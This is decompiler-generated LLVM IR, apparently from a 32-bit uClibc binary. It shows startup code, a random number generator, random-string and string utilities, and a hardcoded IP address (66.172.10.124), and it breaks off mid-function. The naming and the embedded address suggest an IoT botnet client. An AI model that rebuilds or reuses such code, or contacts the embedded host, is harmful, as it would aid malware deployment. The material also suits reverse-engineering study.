source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805200c.2 = global i32 0
@global_var_8052024.3 = local_unnamed_addr global i32* @global_var_805200c.2
@global_var_805165c.4 = constant i32 0
@global_var_8052010.6 = local_unnamed_addr global i32 0
@global_var_8052310.8 = local_unnamed_addr global i32 0
@global_var_8052314.9 = local_unnamed_addr global i32 0
@global_var_8052318.10 = local_unnamed_addr global i32 0
@global_var_804fd0e.11 = constant [30 x i8] c"fjh249f20348rh13rf8j13ru310rt\00"
@global_var_804fd2c.12 = constant [7 x i8] c"(null)\00"
@global_var_8052038 = external local_unnamed_addr global i32
@global_var_8050140.14 = constant i32 65536
@global_var_8052308.15 = local_unnamed_addr global i32 0
@global_var_8052300.16 = local_unnamed_addr global i32 0
@global_var_8052304.17 = local_unnamed_addr global i32 0
@global_var_8054564.18 = local_unnamed_addr global i32 0
@global_var_804fd35.20 = constant i32 4915244
@global_var_8052030.22 = local_unnamed_addr global i32 -1
@global_var_804fd00.23 = constant [14 x i8] c"66.172.10.124\00"
@global_var_805202c.24 = global [14 x i8]* @global_var_804fd00.23
@global_var_804fd39.25 = constant i32 2097199
@global_var_804fd3b.26 = constant i32 32
@global_var_8052040.27 = local_unnamed_addr global i32* @global_var_8050140.14
@global_var_8052520.28 = global i32 0
@global_var_805231c.29 = global i32 0
@global_var_8052320.30 = global i32 0
@global_var_80524ec.31 = global i32 0
@global_var_8052160.32 = global i32 0
@global_var_8054994.33 = local_unnamed_addr global i32 0
@global_var_8054988.34 = global i32 0
@global_var_8054580.35 = global i32 0
@global_var_8052044.36 = global i32 0
@global_var_805462c.38 = global i32 0
@global_var_8054630.39 = local_unnamed_addr global i32 0
@global_var_8054634.40 = global i32 0
@global_var_8054640.41 = local_unnamed_addr global i32 0
@global_var_8054934.42 = global i32 0
@global_var_805495c.43 = local_unnamed_addr global i32 0
@global_var_805494c.44 = local_unnamed_addr global i32 0
@global_var_8054950.45 = local_unnamed_addr global i32 0
@global_var_8054954.46 = local_unnamed_addr global i32 0
@global_var_8054958.47 = local_unnamed_addr global i32 0
@global_var_8054964.48 = local_unnamed_addr global i32 0
@global_var_8054970.49 = local_unnamed_addr global i32 0
@global_var_8054968.50 = local_unnamed_addr global i32 0
@global_var_8054974.51 = local_unnamed_addr global i32 0
@global_var_8054948.52 = local_unnamed_addr global i32 0
@global_var_8054944.54 = local_unnamed_addr global i32 0
@global_var_805496c.55 = local_unnamed_addr global i32 0
@global_var_805463c.56 = local_unnamed_addr global i32 0
@global_var_805205c.57 = global i32 0
@global_var_8052074.59 = global i32 0
@global_var_805208c = external global i32
@global_var_80520c4.61 = global i32 -1726662223
@global_var_8052094.62 = local_unnamed_addr global i32* @global_var_80520c4.61
@global_var_8052090.63 = global i32* @global_var_80520c4.61
@global_var_8050354.64 = constant i32 0
@global_var_8050340.65 = constant i32 0
@global_var_8052140.66 = global i32 0
@global_var_8052504.67 = local_unnamed_addr global i32 0
@global_var_8052000.69 = global i32 -1
@global_var_804b5b7.70 = constant i32 -294069
@global_var_8052514.71 = local_unnamed_addr global i32 0
@global_var_8052518.72 = local_unnamed_addr global i32 0
@global_var_80505c0.73 = constant [10 x i8] c"/dev/null\00"
@global_var_8052510.75 = local_unnamed_addr global i32 0
@global_var_8052508.76 = local_unnamed_addr global i32 0
@global_var_805250c.77 = local_unnamed_addr global i32 0
@global_var_8050985.78 = constant i32 1970153472
@global_var_8052158.79 = local_unnamed_addr global i32* @global_var_8050985.78
@global_var_804b79d.80 = constant i32 1928542531
@global_var_804b7c1.81 = constant i32 1928542531
@global_var_8052544.82 = local_unnamed_addr global i32 0
@global_var_8052524.83 = global i32 0
@global_var_8054998.87 = local_unnamed_addr global i32 0
@global_var_80505ca.88 = constant i32 1697579054
@global_var_80505fe.89 = constant i32 1868824690
@global_var_80505cc.90 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80505dd.91 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_80505f5.92 = constant [11 x i8] c"nameserver\00"
@global_var_8050600.93 = constant [7 x i8] c"domain\00"
@global_var_8050607.94 = constant [7 x i8] c"search\00"
@global_var_8054978.95 = global i32 0
@global_var_805499c.96 = local_unnamed_addr global i32 0
@global_var_80549a0.97 = local_unnamed_addr global i32 0
@global_var_80521a8.98 = global i32 0
@global_var_8052548.99 = local_unnamed_addr global i32 0
@global_var_805254c.100 = local_unnamed_addr global i32 0
@global_var_80521c0.101 = local_unnamed_addr global i32 2
@global_var_8052190.102 = global i32 0
@global_var_80521e0.103 = global i32 288
@global_var_805218c.104 = global i32* @global_var_80521e0.103
@global_var_8052230.105 = local_unnamed_addr global i32 272
@global_var_8050610.106 = constant i32 0
@global_var_805063c.107 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8050639.109 = constant [3 x i8] c"%x\00"
@global_var_805064d.110 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8050658.111 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8050780.112 = constant i32 65536
@global_var_80522d4.113 = local_unnamed_addr global i32* @global_var_8050780.112
@global_var_8050980.114 = constant [6 x i8] c"(nil)\00"
@global_var_8050986.115 = constant [7 x i8] c"(null)\00"
@global_var_805098d.116 = constant i32 2949163
@global_var_80509fa.118 = constant i32 327688
@global_var_80509f2.119 = constant [8 x i8] c" +0-#'I\00"
@global_var_80509a0.120 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80509dd.121 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80509d3.122 = constant i32 117506048
@global_var_80509c4.123 = constant i32 331776
@global_var_8050a40.124 = constant [8 x i8] c"Success\00"
@global_var_8050a1e.125 = constant [15 x i8] c"Unknown error \00"
@global_var_80515ac.127 = constant [4 x i8] c"inf\00"
@global_var_80515af.132 = constant i32 1179535616
@global_var_80515bc.133 = constant i32 2883630
@global_var_80522e0.1 = local_unnamed_addr global i8 0
@global_var_805230c.7 = local_unnamed_addr global i8 0
@1 = internal constant [2 x i8] c"S\00"
@global_var_804fd33.19 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@2 = internal constant [2 x i8] c"K\00"
@global_var_804fd37.21 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8054600.37 = global i8 0
@global_var_8054960.53 = local_unnamed_addr global i8 0
@global_var_8052500.58 = local_unnamed_addr global i8 0
@global_var_805251c.74 = local_unnamed_addr global i8 0
@global_var_8052528.84 = external global i8*
@global_var_8052540.85 = local_unnamed_addr global i64 0
@global_var_805215c.86 = local_unnamed_addr global i16 1
@global_var_8050a12.117 = external constant i8*

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 40823
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80522e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80522e0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8052024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80522e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805165c.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8052010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134517408, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134544616, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @rand_init() local_unnamed_addr {
entry:
  %v0_804818b = load i32, i32* @ebx, align 4
  %v2_8048194 = call i32 @__GI_time(i32* null)
  %v1_804819c = trunc i32 %v2_8048194 to i8
  store i8 %v1_804819c, i8* @global_var_805230c.7, align 4
  %v0_80481a1 = call i32 @__libc_getpid()
  store i32 %v0_80481a1, i32* @ebx, align 4
  %v1_80481a8 = call i32 @getppid(i32 0)
  %v1_80481ad = load i32, i32* @ebx, align 4
  %v2_80481ad = xor i32 %v1_80481ad, %v1_80481a8
  store i32 %v2_80481ad, i32* @global_var_8052310.8, align 16
  %v0_80481b4 = call i32 @clock()
  store i32 %v0_80481b4, i32* @global_var_8052314.9, align 4
  %v0_80481c4 = load i32, i32* @global_var_8052310.8, align 16
  %v2_80481c9 = xor i32 %v0_80481c4, %v0_80481b4
  store i32 %v2_80481c9, i32* @global_var_8052318.10, align 8
  store i32 %v0_804818b, i32* @ebx, align 4
  ret i32 %v2_80481c9
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v0_80481db = load i8, i8* @global_var_805230c.7, align 1
  %v1_80481db = sext i8 %v0_80481db to i32
  %v2_80481ef = udiv i32 %v1_80481db, 256
  %v6_80481f2 = xor i32 %v2_80481ef, %v1_80481db
  %v0_80481f5 = load i32, i32* @global_var_8052310.8, align 16
  %v1_80481fa = trunc i32 %v0_80481f5 to i8
  store i8 %v1_80481fa, i8* @global_var_805230c.7, align 4
  %v0_80481ff = load i32, i32* @global_var_8052314.9, align 4
  store i32 %v0_80481ff, i32* @global_var_8052310.8, align 16
  %v0_8048209 = load i32, i32* @global_var_8052318.10, align 8
  store i32 %v0_8048209, i32* @global_var_8052314.9, align 4
  %v2_804821a = udiv i32 %v0_8048209, 524288
  store i32 %v2_804821a, i32* @edx, align 4
  %sext = mul i32 %v6_80481f2, 16777216
  %v5_804822e = sdiv i32 %sext, 16777216
  %v2_8048222 = xor i32 %v5_804822e, %v0_8048209
  %v6_804822e = xor i32 %v2_8048222, %v2_804821a
  store i32 %v6_804822e, i32* @global_var_8052318.10, align 8
  ret i32 %v6_804822e

; uselistorder directives
  uselistorder i32 %v2_804821a, { 1, 0 }
  uselistorder i32 %v0_8048209, { 1, 0, 2 }
  uselistorder i32 %v1_80481db, { 1, 0 }
  uselistorder i8* @global_var_805230c.7, { 2, 1, 0 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp58 = icmp slt i32 %arg2, 1
  %tmp69 = icmp eq i1 %tmp58, false
  br i1 %tmp69, label %dec_label_pc_8048243, label %dec_label_pc_804829a

dec_label_pc_8048243:                             ; preds = %entry, %dec_label_pc_8048294.backedge
  %stack_var_8.011 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_8048294.backedge ], [ %arg2, %entry ]
  %stack_var_4.010 = phi i16* [ %stack_var_4.0.be, %dec_label_pc_8048294.backedge ], [ %arg1, %entry ]
  %v7_8048247 = icmp sgt i32 %stack_var_8.011, 3
  br i1 %v7_8048247, label %dec_label_pc_8048249, label %dec_label_pc_8048262

dec_label_pc_8048249:                             ; preds = %dec_label_pc_8048243
  %v4_8048249 = ptrtoint i16* %stack_var_4.010 to i32
  %v0_804824c = call i32 @rand_next()
  %v2_8048251 = bitcast i16* %stack_var_4.010 to i32*
  store i32 %v0_804824c, i32* %v2_8048251, align 4
  %v5_8048253 = add i32 %v4_8048249, 4
  %v1_804825a = add i32 %stack_var_8.011, -4
  store i32 %v1_804825a, i32* @eax, align 4
  br label %dec_label_pc_8048294.backedge

dec_label_pc_8048262:                             ; preds = %dec_label_pc_8048243
  %v7_8048266 = icmp sgt i32 %stack_var_8.011, 1
  br i1 %v7_8048266, label %dec_label_pc_8048268, label %dec_label_pc_8048282

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048262
  %v4_8048268 = ptrtoint i16* %stack_var_4.010 to i32
  %v0_804826b = call i32 @rand_next()
  %v1_804826b = trunc i32 %v0_804826b to i16
  store i16 %v1_804826b, i16* %stack_var_4.010, align 2
  %v5_8048273 = add i32 %v4_8048268, 2
  %v1_804827a = add i32 %stack_var_8.011, -2
  store i32 %v1_804827a, i32* @eax, align 4
  br label %dec_label_pc_8048294.backedge

dec_label_pc_8048282:                             ; preds = %dec_label_pc_8048262
  %v5_8048262 = add i32 %stack_var_8.011, -1
  %v0_8048282 = call i32 @rand_next()
  %v4_8048289 = ptrtoint i16* %stack_var_4.010 to i32
  store i32 %v4_8048289, i32* @eax, align 4
  %v1_804828c = trunc i32 %v0_8048282 to i8
  %v3_804828c = bitcast i16* %stack_var_4.010 to i8*
  store i8 %v1_804828c, i8* %v3_804828c, align 1
  %v5_804828e = add i32 %v4_8048289, 1
  br label %dec_label_pc_8048294.backedge

dec_label_pc_8048294.backedge:                    ; preds = %dec_label_pc_8048282, %dec_label_pc_8048249, %dec_label_pc_8048268
  %stack_var_4.0.be.in = phi i32 [ %v5_8048253, %dec_label_pc_8048249 ], [ %v5_8048273, %dec_label_pc_8048268 ], [ %v5_804828e, %dec_label_pc_8048282 ]
  %stack_var_8.0.be = phi i32 [ %v1_804825a, %dec_label_pc_8048249 ], [ %v1_804827a, %dec_label_pc_8048268 ], [ %v5_8048262, %dec_label_pc_8048282 ]
  %stack_var_4.0.be = inttoptr i32 %stack_var_4.0.be.in to i16*
  %tmp5 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp6 = icmp eq i1 %tmp5, false
  br i1 %tmp6, label %dec_label_pc_8048243, label %dec_label_pc_8048294.dec_label_pc_804829a_crit_edge

dec_label_pc_8048294.dec_label_pc_804829a_crit_edge: ; preds = %dec_label_pc_8048294.backedge
  br label %dec_label_pc_804829a

dec_label_pc_804829a:                             ; preds = %dec_label_pc_8048294.dec_label_pc_804829a_crit_edge, %entry
  %v0_804829c = load i32, i32* @eax, align 4
  ret i32 %v0_804829c

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i16* %stack_var_4.010, { 4, 5, 1, 3, 0, 2 }
  uselistorder i32 %stack_var_8.011, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048294.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048243, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-58 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80482a2 = load i32, i32* @ebx, align 4
  store i32 %v0_80482a2, i32* %stack_var_-16, align 4
  %tmp23 = bitcast i32* %stack_var_-58 to i8*
  store i1 false, i1* @df, align 1
  %v7_80482b4 = call i8* @_memcpy(i8* %tmp23, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @global_var_804fd0e.11, i32 0, i32 0), i32 30)
  %tmp2432 = icmp slt i32 %arg2, 1
  %tmp2533 = icmp eq i1 %tmp2432, false
  br i1 %tmp2533, label %dec_label_pc_80482bb, label %dec_label_pc_8048350

dec_label_pc_80482bb:                             ; preds = %entry, %dec_label_pc_8048346.backedge
  %stack_var_4.135 = phi i8* [ %stack_var_4.1.be, %dec_label_pc_8048346.backedge ], [ %arg1, %entry ]
  %stack_var_8.034 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_8048346.backedge ], [ %arg2, %entry ]
  %tmp36 = icmp ult i32 %stack_var_8.034, 4
  %v0_804830e = call i32 @rand_next()
  br i1 %tmp36, label %dec_label_pc_804830e, label %dec_label_pc_80482c3

dec_label_pc_80482c3:                             ; preds = %dec_label_pc_80482bb
  br label %dec_label_pc_80482d4

dec_label_pc_80482d4:                             ; preds = %dec_label_pc_80482d4, %dec_label_pc_80482c3
  %stack_var_-24.030.in = phi i32 [ %v0_804830e, %dec_label_pc_80482c3 ], [ %v6_80482da, %dec_label_pc_80482d4 ]
  %storemerge29 = phi i32 [ 0, %dec_label_pc_80482c3 ], [ %v4_80482f8, %dec_label_pc_80482d4 ]
  %stack_var_4.028 = phi i8* [ %stack_var_4.135, %dec_label_pc_80482c3 ], [ %v22_80482f5, %dec_label_pc_80482d4 ]
  %stack_var_-24.030 = trunc i32 %stack_var_-24.030.in to i8
  %sext = mul i32 %stack_var_-24.030.in, 16777216
  %v4_80482d4 = sdiv i32 %sext, 16777216
  %v6_80482da = udiv i32 %v4_80482d4, 256
  %v5_80482de = udiv i8 %stack_var_-24.030, 8
  %v4_80482e7 = zext i8 %v5_80482de to i32
  %v0_80482ea = load i32, i32* @ebp, align 4
  %v2_80482ea = add nsw i32 %v4_80482e7, -54
  %v3_80482ea = add i32 %v2_80482ea, %v0_80482ea
  %v4_80482ea = inttoptr i32 %v3_80482ea to i8*
  %v5_80482ea = load i8, i8* %v4_80482ea, align 1
  %v6_80482ea = zext i8 %v5_80482ea to i32
  %v2_80482ee = load i32, i32* @edx, align 4
  %v3_80482ee = and i32 %v2_80482ee, -256
  %v4_80482ee = or i32 %v3_80482ee, %v6_80482ea
  store i32 %v4_80482ee, i32* @edx, align 4
  %v4_80482f0 = ptrtoint i8* %stack_var_4.028 to i32
  store i8 %v5_80482ea, i8* %stack_var_4.028, align 1
  %v5_80482f5 = add i32 %v4_80482f0, 1
  %v22_80482f5 = inttoptr i32 %v5_80482f5 to i8*
  %v4_80482f8 = add nuw nsw i32 %storemerge29, 1
  %exitcond = icmp eq i32 %v4_80482f8, 4
  br i1 %exitcond, label %dec_label_pc_8048303, label %dec_label_pc_80482d4

dec_label_pc_8048303:                             ; preds = %dec_label_pc_80482d4
  %v1_8048306 = add i32 %stack_var_8.034, -4
  store i32 %v1_8048306, i32* @eax, align 4
  br label %dec_label_pc_8048346.backedge

dec_label_pc_804830e:                             ; preds = %dec_label_pc_80482bb
  %v14_8048333 = trunc i32 %v0_804830e to i8
  %v4_804833b = ptrtoint i8* %stack_var_4.135 to i32
  store i32 %v4_804833b, i32* @eax, align 4
  store i8 %v14_8048333, i8* %stack_var_4.135, align 1
  %v5_8048340 = add i32 %v4_804833b, 1
  %v22_8048340 = inttoptr i32 %v5_8048340 to i8*
  %v4_8048343 = add i32 %stack_var_8.034, -1
  br label %dec_label_pc_8048346.backedge

dec_label_pc_8048346.backedge:                    ; preds = %dec_label_pc_804830e, %dec_label_pc_8048303
  %stack_var_8.0.be = phi i32 [ %v4_8048343, %dec_label_pc_804830e ], [ %v1_8048306, %dec_label_pc_8048303 ]
  %stack_var_4.1.be = phi i8* [ %v22_8048340, %dec_label_pc_804830e ], [ %v22_80482f5, %dec_label_pc_8048303 ]
  %tmp24 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp25 = icmp eq i1 %tmp24, false
  br i1 %tmp25, label %dec_label_pc_80482bb, label %dec_label_pc_8048350

dec_label_pc_8048350:                             ; preds = %dec_label_pc_8048346.backedge, %entry
  %v2_8048353 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8048353, i32* @ebx, align 4
  %v0_8048357 = load i32, i32* @eax, align 4
  ret i32 %v0_8048357

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder label %dec_label_pc_80482bb, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %v0_8048358 = load i32, i32* @ebp, align 4
  %v4_804836a5 = ptrtoint i8* %arg1 to i32
  %v2_804836d6 = load i8, i8* %arg1, align 1
  %v4_804836f7 = icmp eq i8 %v2_804836d6, 0
  %v1_80483718 = icmp eq i1 %v4_804836f7, false
  %v4_804837712 = icmp eq i1 %v1_80483718, false
  %v1_804837913 = icmp eq i1 %v4_804837712, false
  br i1 %v1_804837913, label %dec_label_pc_8048367, label %dec_label_pc_804837b

dec_label_pc_8048367:                             ; preds = %entry, %dec_label_pc_8048367
  %v4_804836a15 = phi i32 [ %v5_8048374, %dec_label_pc_8048367 ], [ %v4_804836a5, %entry ]
  %storemerge14 = phi i32 [ %v4_8048367, %dec_label_pc_8048367 ], [ 0, %entry ]
  %v5_8048374 = add i32 %v4_804836a15, 1
  %v22_8048374 = inttoptr i32 %v5_8048374 to i8*
  %v4_8048367 = add i32 %storemerge14, 1
  %v2_804836d = load i8, i8* %v22_8048374, align 1
  %v4_804836f = icmp eq i8 %v2_804836d, 0
  %v1_8048371 = icmp eq i1 %v4_804836f, false
  %v4_8048377 = icmp eq i1 %v1_8048371, false
  %v1_8048379 = icmp eq i1 %v4_8048377, false
  br i1 %v1_8048379, label %dec_label_pc_8048367, label %dec_label_pc_804837b

dec_label_pc_804837b:                             ; preds = %dec_label_pc_8048367, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_8048367, %dec_label_pc_8048367 ]
  store i32 %v0_8048358, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048374, { 1, 0 }
  uselistorder label %dec_label_pc_8048367, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v13_80483a712 = icmp eq i32 %arg3, 0
  %v1_80483ab13 = icmp eq i1 %v13_80483a712, false
  br i1 %v1_80483ab13, label %dec_label_pc_8048394, label %dec_label_pc_80483ad

dec_label_pc_8048394:                             ; preds = %entry, %dec_label_pc_8048394
  %storemerge.in16 = phi i32 [ %v5_80483a1, %dec_label_pc_8048394 ], [ %arg2, %entry ]
  %stack_var_12.015 = phi i32 [ %v4_80483a4, %dec_label_pc_8048394 ], [ %arg3, %entry ]
  %stack_var_-12.014 = phi i8* [ %v22_804839e, %dec_label_pc_8048394 ], [ %arg1, %entry ]
  %v4_80483a4 = add i32 %stack_var_12.015, -1
  %storemerge = inttoptr i32 %storemerge.in16 to i8*
  store i32 %storemerge.in16, i32* %eax.global-to-local, align 4
  %v2_8048397 = load i8, i8* %storemerge, align 1
  %v3_8048397 = zext i8 %v2_8048397 to i32
  %v4_8048397 = load i32, i32* @edx, align 4
  %v5_8048397 = and i32 %v4_8048397, -256
  %v6_8048397 = or i32 %v5_8048397, %v3_8048397
  store i32 %v6_8048397, i32* @edx, align 4
  %v4_8048399 = ptrtoint i8* %stack_var_-12.014 to i32
  store i32 %v4_8048399, i32* %eax.global-to-local, align 4
  store i8 %v2_8048397, i8* %stack_var_-12.014, align 1
  %v5_804839e = add i32 %v4_8048399, 1
  %v22_804839e = inttoptr i32 %v5_804839e to i8*
  %v5_80483a1 = add i32 %storemerge.in16, 1
  %v13_80483a7 = icmp eq i32 %v4_80483a4, 0
  %v1_80483ab = icmp eq i1 %v13_80483a7, false
  br i1 %v1_80483ab, label %dec_label_pc_8048394, label %dec_label_pc_80483a4.dec_label_pc_80483ad_crit_edge

dec_label_pc_80483a4.dec_label_pc_80483ad_crit_edge: ; preds = %dec_label_pc_8048394
  %v0_80483ae.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80483ad

dec_label_pc_80483ad:                             ; preds = %dec_label_pc_80483a4.dec_label_pc_80483ad_crit_edge, %entry
  %v0_80483ae = phi i32 [ %v0_80483ae.pre, %dec_label_pc_80483a4.dec_label_pc_80483ad_crit_edge ], [ %arg2, %entry ]
  ret i32 %v0_80483ae

; uselistorder directives
  uselistorder i32 %v4_80483a4, { 1, 0 }
  uselistorder i32 %storemerge.in16, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048394, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80483af = load i32, i32* @ebp, align 4
  store i32 %v0_80483af, i32* %stack_var_-4, align 4
  %v4_80483af = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80483af, i32* @ebp, align 4
  %v1_80483b8 = inttoptr i32 %arg2 to i8*
  %v2_80483b8 = call i32 @util_strlen(i8* %v1_80483b8)
  %v1_80483c6 = add i32 %v2_80483b8, 1
  %v3_80483ce = inttoptr i32 %arg1 to i8*
  %v4_80483ce = call i32 @util_memcpy(i8* %v3_80483ce, i32 %arg2, i32 %v1_80483c6)
  %v2_80483d9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80483d9, i32* @ebp, align 4
  ret i32 %v2_80483b8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
